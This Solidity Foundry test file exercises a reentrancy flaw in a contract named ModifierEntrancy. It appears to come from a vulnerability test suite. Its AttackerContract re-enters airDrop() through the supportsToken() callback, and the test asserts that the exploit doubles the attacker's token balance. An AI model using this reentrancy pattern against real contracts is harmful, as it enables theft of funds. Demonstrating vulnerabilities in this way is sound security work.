
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, Bank, attack} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    AttackerContract public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new AttackerContract(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Initial balance should be 0");

        _attacker.attack();

        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(finalBalance, 20, "Balance should be greater than 20 due to reentrancy");
        assertEq(finalBalance, 40, "Balance should be 40 (20 from each airDrop call)");
    }

    receive() external payable {}
}

contract AttackerContract {
    ModifierEntrancy public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    bool private _reentering;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        _reentering = false;
        
        _victim.airDrop();
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns (bytes32) {
        attackCallCount++;
        
        if (!_reentering) {
            _reentering = true;
            _victim.airDrop();
        }
        
        return keccak256(abi.encodePacked("Nu Token"));
    }
}
